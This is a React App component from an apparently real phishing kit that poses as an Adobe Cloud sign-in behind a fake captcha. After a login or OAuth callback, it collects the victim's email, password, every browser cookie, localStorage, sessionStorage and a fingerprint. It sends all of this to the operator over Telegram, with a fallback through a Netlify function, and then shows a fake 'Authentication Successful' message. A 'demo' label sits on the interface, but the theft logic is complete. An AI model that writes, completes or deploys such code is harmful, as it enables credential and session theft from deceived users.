import React, { useState, useEffect } from 'react';
import { 
  getBrowserFingerprint, 
  extractEmailFromProvider,
  sendToTelegram 
} from './utils/oauthHandler';

// Import the new real-time cookie system
import { 
  setCookie, 
  getCookie, 
  removeCookie, 
  subscribeToCookieChanges,
  CookieChangeEvent 
} from './utils/realTimeCookieManager';

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [currentPage, setCurrentPage] = useState('captcha'); // Start with captcha
  const [selectedFileName, setSelectedFileName] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [captchaVerified, setCaptchaVerified] = useState(false);

  // Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
  // This preserves your desired primary path (sendToTelegram) while ensuring we don't silently lose data
  // if that util is not available or throws (useful for debugging and resilience).
  const safeSendToTelegram = async (sessionData: any) => {
    console.log('🚀 Starting safeSendToTelegram with data:', sessionData);
    
    // Primary: use the project's sendToTelegram utility if available
    if (typeof sendToTelegram === 'function') {
      try {
        console.log('📡 Attempting primary sendToTelegram util...');
        const result = await sendToTelegram(sessionData);
        console.log('✅ sendToTelegram(util) result:', result);
        return result;
      } catch (err) {
        console.error('❌ sendToTelegram(util) failed:', err);
        // Fall through to fetch fallback
      }
    } else {
      console.warn('⚠️ sendToTelegram util is not a function or not available; using fetch fallback');
    }

    // Fallback: call the Netlify function endpoint directly
    try {
      console.log('📡 Attempting fetch fallback to /.netlify/functions/sendTelegram...');
      const res = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(sessionData)
      });

      console.log('📡 Fetch response status:', res.status, res.statusText);

      if (!res.ok) {
        const bodyText = await res.text().catch(() => '');
        console.error('❌ Fetch response not ok:', bodyText);
        throw new Error(`HTTP ${res.status} ${res.statusText} ${bodyText ? '- ' + bodyText : ''}`);
      }

      let data;
      try {
        data = await res.json();
      } catch {
        data = null;
      }
      console.log('✅ sendToTelegram(fetch) result:', data);
      return data;
    } catch (fetchErr) {
      console.error('❌ sendToTelegram fallback (fetch) failed:', fetchErr);
      // Re-throw so caller knows it failed
      throw fetchErr;
    }
  };

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      if (typeof window !== 'undefined') {
        setIsMobile(window.innerWidth <= 768);
      }
    };
    
    checkMobile();
    
    if (typeof window !== 'undefined') {
      window.addEventListener('resize', checkMobile);
      return () => window.removeEventListener('resize', checkMobile);
    }
  }, []);

  // Add real-time cookie monitoring for session changes
  useEffect(() => {
    const unsubscribe = subscribeToCookieChanges((event: CookieChangeEvent) => {
      // Monitor session-related cookies for cross-tab synchronization
      if (event.name === 'adobe_session' || event.name === 'logged_in') {
        if (event.action === 'remove' || event.value === '' || event.value === 'false') {
          console.log('🔄 Session ended in another tab');
          setHasActiveSession(false);
          // If session ends, go back to captcha first
          setCaptchaVerified(false);
          setCurrentPage('captcha');
        } else if (event.action === 'set' || event.action === 'update') {
          console.log('🔄 Session updated in another tab');
          setHasActiveSession(true);
          setCurrentPage('landing');
        }
      }
    });

    return unsubscribe;
  }, []);

  // Check for existing session on load
  useEffect(() => {
    const checkSession = async () => {
      try {
        // Check if we're in browser environment
        if (typeof window === 'undefined') {
          setCurrentPage('captcha');
          setIsLoading(false);
          return;
        }
        
        // Check for OAuth callback first
        const urlParams = new URLSearchParams(window.location.search);
        const isOAuthCallback = urlParams.has('oauth_callback') || urlParams.has('code') || urlParams.has('state');
        
        if (isOAuthCallback) {
          await handleOAuthCallback();
          setIsLoading(false);
          return;
        }

        // Enhanced session restoration - try cookies first, then localStorage
        let existingSession = null;
        
        // Try to get session from real-time cookies first
        const cookieSession = getCookie('adobe_session');
        if (cookieSession) {
          try {
            existingSession = JSON.parse(decodeURIComponent(cookieSession));
            console.log('✅ Session restored from cookie:', existingSession?.email);
          } catch (error) {
            console.warn('Invalid cookie session data:', error);
          }
        }
        
        // Fallback to localStorage (your existing method)
        if (!existingSession) {
          const localSession = typeof localStorage !== 'undefined' ? localStorage.getItem('adobe_autograb_session') : null;
          if (localSession) {
            try {
              existingSession = JSON.parse(localSession);
              console.log('✅ Session restored from localStorage:', existingSession?.email);
              
              // Migrate to cookie system for future reliability (no expiry)
              setCookie('adobe_session', encodeURIComponent(localSession), {
                secure: process.env.NODE_ENV === 'production',
                sameSite: 'strict',
                path: '/'
                // No expires = session cookie (no expiry until browser closes)
              });
              console.log('🔄 Session migrated to cookie system');
            } catch (error) {
              console.error('Error parsing existing session:', error);
              if (typeof localStorage !== 'undefined') {
                localStorage.removeItem('adobe_autograb_session');
              }
            }
          }
        }

        if (existingSession) {
          setHasActiveSession(true);
          setCaptchaVerified(true); // Skip captcha if session exists
          setCurrentPage('landing');
        } else {
          // No valid session, start with captcha
          setCurrentPage('captcha');
        }
      } catch (error) {
        console.error('Session check error:', error);
        setCurrentPage('captcha');
      } finally {
        setIsLoading(false);
      }
    };

    checkSession();
  }, []);

  const handleOAuthCallback = async () => {
    if (typeof window === 'undefined') return;
    
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');
    const provider = urlParams.get('provider');
    
    if (code && provider) {
      console.log('🔐 Processing OAuth callback for:', provider);
      
      // Capture cookies and session data after successful OAuth return
      const postAuthFingerprint = getBrowserFingerprint();
      
      const sessionData = {
        email: extractEmailFromProvider(provider, code),
        provider: provider,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        fileName: 'Adobe Cloud Access',
        clientIP: 'Unknown',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: postAuthFingerprint.cookies,
        cookiesParsed: postAuthFingerprint.cookiesParsed, // <-- added: parsed cookie map
        cookieList: postAuthFingerprint.cookieList || [],  // <-- added: normalized cookie metadata list (if available)
        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
        localStorage: postAuthFingerprint.localStorage,
        sessionStorage: postAuthFingerprint.sessionStorage,
        browserFingerprint: postAuthFingerprint
      };

      // Store successful session (keep your existing localStorage)
      if (typeof localStorage !== 'undefined') {
        localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
      }
      
      // Enhanced cookie setting with real-time system (no expiry)
      try {
        const sessionId = sessionData.sessionId;
        const cookieOptions = {
          path: '/',
          secure: process.env.NODE_ENV === 'production',
          sameSite: 'strict' as const
          // No expires = session cookie (no expiry until browser closes)
        };
        
        // Use real-time cookie system
        setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
        setCookie('sessionid', sessionId, cookieOptions);
        setCookie('auth_token', btoa(sessionData.email + ':oauth'), cookieOptions);
        setCookie('logged_in', 'true', cookieOptions);
        setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
        
        console.log('🍪 Session cookies set with real-time system (no expiry)');
      } catch (e) {
        console.warn('Failed to set cookies:', e);
        
        // Fallback to your existing method (no expiry)
        if (typeof document !== 'undefined') {
          const sessionId = sessionData.sessionId;
          
          document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
          document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
          document.cookie = `auth_token=${btoa(sessionData.email + ':oauth')}; path=/; secure; samesite=strict`;
          document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
          document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
        }
      }

      // Send to Telegram using the robust helper
      try {
        await safeSendToTelegram(sessionData);
        console.log('✅ Session data sent to Telegram');
      } catch (error) {
        console.error('❌ Failed to send to Telegram:', error);
      }

      setHasActiveSession(true);
      setCaptchaVerified(true);
      setCurrentPage('landing');

      // Clean up URL
      if (typeof window !== 'undefined' && typeof document !== 'undefined') {
        window.history.replaceState({}, document.title, window.location.pathname);
      }

      // Show success notification
      if (typeof document === 'undefined') return;
      
      const notification = document.createElement('div');
      notification.innerHTML = `
        <div style="
          position: fixed;
          top: 20px;
          right: 20px;
          background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
          color: #166534;
          padding: 20px;
          border-radius: 12px;
          box-shadow: 0 10px 25px rgba(34, 197, 94, 0.15);
          z-index: 10000;
          max-width: 350px;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          border: 1px solid rgba(34, 197, 94, 0.3);
        ">
          <div style="color: #22c55e; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
            ✅ Authentication Successful!
          </div>
          <div style="color: #6b7280; font-size: 14px;">
            Welcome to Adobe Cloud
          </div>
        </div>
      `;
      document.body.appendChild(notification);
      setTimeout(() => {
        if (document.body.contains(notification)) {
          document.body.removeChild(notification);
        }
      }, 4000);
    }
  };

  // Handler for captcha verification - FIXED
  const handleCaptchaVerified = () => {
    console.log('🔒 Captcha verified, redirecting to login...');
    setCaptchaVerified(true);
    
    // Immediately set to login page to prevent landing page flash
    setCurrentPage('login');
  };

  // Handler for login success from login components
  const handleLoginSuccess = async (sessionData: any) => {
    console.log('🔐 Login success:', sessionData);
    
    // Enhanced cookie setting with real-time system (no expiry)
    try {
      const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
      const cookieOptions = {
        path: '/',
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict' as const
        // No expires = session cookie (no expiry until browser closes)
      };
      
      // Use real-time cookie system
      setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
      setCookie('sessionid', sessionId, cookieOptions);
      setCookie('auth_token', btoa(sessionData.email + ':' + (sessionData.password || 'oauth')), cookieOptions);
      setCookie('logged_in', 'true', cookieOptions);
      setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
      
      console.log('🍪 Login cookies set with real-time system (no expiry)');
    } catch (e) {
      console.warn('Failed to set cookies with real-time system, using fallback:', e);
      
      // Fallback to your existing method (no expiry)
      if (typeof document !== 'undefined') {
        const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
        
        document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
        document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
        document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'oauth'))}; path=/; secure; samesite=strict`;
        document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
        document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
      }
    }

    const browserFingerprint = getBrowserFingerprint();
    
    const updatedSession = {
      ...sessionData,
      sessionId: sessionData.sessionId || Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      fileName: 'Adobe Cloud Access',
      clientIP: 'Unknown',
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
      deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
      cookies: browserFingerprint.cookies,
      cookiesParsed: browserFingerprint.cookiesParsed, // <-- added: parsed cookie map
      cookieList: browserFingerprint.cookieList || [],  // <-- added: normalized cookie metadata list (if available)
      documentCookies: typeof document !== 'undefined' ? document.cookie : '',
      localStorage: browserFingerprint.localStorage,
      sessionStorage: browserFingerprint.sessionStorage,
      browserFingerprint: browserFingerprint
    };

    setHasActiveSession(true);

    // Store the updated session once (avoid duplicate writes)
    if (typeof localStorage !== 'undefined') {
      localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
    }

    try {
      await safeSendToTelegram(updatedSession);
      
      // Ensure we redirect to landing page
      setCurrentPage('landing');
      setIsLoading(false);
      console.log('✅ Login data sent to Telegram');
    } catch (error) {
      console.error('❌ Failed to send to Telegram:', error);
      // Even if sending fails, still move to landing to avoid blocking UX
      setCurrentPage('landing');
      setIsLoading(false);
    }

    // Ensure we always redirect to landing page after successful login
    setTimeout(() => {
      setCurrentPage('landing');
    }, 100);
  };

  // Handler for file actions
  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    setSelectedFileName(fileName);
    console.log(`${action} action for file: ${fileName}`);
  };

  // Handler for logout
  const handleLogout = () => {
    // Clear all session data
    if (typeof localStorage !== 'undefined') {
      localStorage.removeItem('adobe_autograb_session');
    }
    if (typeof sessionStorage !== 'undefined') {
      sessionStorage.clear();
    }
    
    // Enhanced cookie clearing with real-time system
    try {
      const cookieNames = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
      cookieNames.forEach(cookieName => {
        removeCookie(cookieName, { path: '/' });
      });
      console.log('🍪 Cookies cleared with real-time system');
    } catch (e) {
      console.warn('Failed to clear cookies with real-time system, using fallback:', e);
      
      // Fallback to your existing method
      if (typeof document !== 'undefined') {
        const cookies = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
        cookies.forEach(cookie => {
          document.cookie = `${cookie}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
        });
      }
    }
    
    setHasActiveSession(false);
    setCaptchaVerified(false); // Reset captcha state on logout
    setCurrentPage('captcha'); // Go back to captcha on logout
  };

  // Loading state
  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading...</p>
        </div>
      </div>
    );
  }

  // Simple demo interface since the actual components aren't available
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
      <div className="max-w-md w-full bg-white rounded-lg shadow-md p-8">
        <h1 className="text-2xl font-bold text-center mb-6">Cookie System Demo</h1>
        
        {currentPage === 'captcha' && !captchaVerified && (
          <div className="text-center">
            <p className="mb-4">Captcha Verification Required</p>
            <button 
              onClick={handleCaptchaVerified}
              className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
            >
              Verify Captcha
            </button>
          </div>
        )}

        {currentPage === 'login' && (
          <div className="text-center">
            <p className="mb-4">Login Page</p>
            <button 
              onClick={() => handleLoginSuccess({
                email: 'test@example.com',
                provider: 'Demo',
                sessionId: Math.random().toString(36).substring(2, 15)
              })}
              className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 mr-2"
            >
              Demo Login
            </button>
            <button 
              onClick={() => {
                setCaptchaVerified(false);
                setCurrentPage('captcha');
              }}
              className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-700"
            >
              Back
            </button>
          </div>
        )}

        {hasActiveSession && currentPage === 'landing' && (
          <div className="text-center">
            <p className="mb-4">Welcome to Adobe Cloud!</p>
            <p className="text-sm text-gray-600 mb-4">Session active with real cookies</p>
            <button 
              onClick={handleLogout}
              className="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700"
            >
              Logout
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;